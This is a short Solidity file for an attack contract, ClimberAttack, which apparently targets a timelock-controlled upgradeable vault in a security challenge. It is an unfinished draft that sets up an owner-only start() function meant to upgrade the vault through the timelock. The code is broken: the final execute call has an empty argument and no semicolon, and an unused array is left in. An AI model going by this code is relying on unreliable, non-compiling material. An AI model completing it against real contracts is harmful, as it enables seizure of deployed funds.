// SPDX-License-Identifier: GPL-2.0+
pragma solidity ^0.8.3;
import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "hardhat/console.sol";
import "./ClimberTimelock.sol";
import "./ClimberVault.sol";

contract ClimberAttack is Ownable{
    ClimberTimelock private _climberTimelock;
    UUPSUpgradeable private _upgradeable;
    constructor(address payable climberTimelockAddress, address upgradeableAddress) Ownable(){
        _climberTimelock = ClimberTimelock(climberTimelockAddress);
        _upgradeable = UUPSUpgradeable(upgradeableAddress);
    }

    function start() onlyOwner public {
        uint[] memory tokenIds = new uint[](6);
        tokenIds[0] = 0;
        console.log(owner());
        // upgrade vault by _climberTimelock
        address[] memory targets = new address[](1);
        targets[0] = address(_upgradeable);

        _climberTimelock.execute(address(_upgradeable), )
    }

}
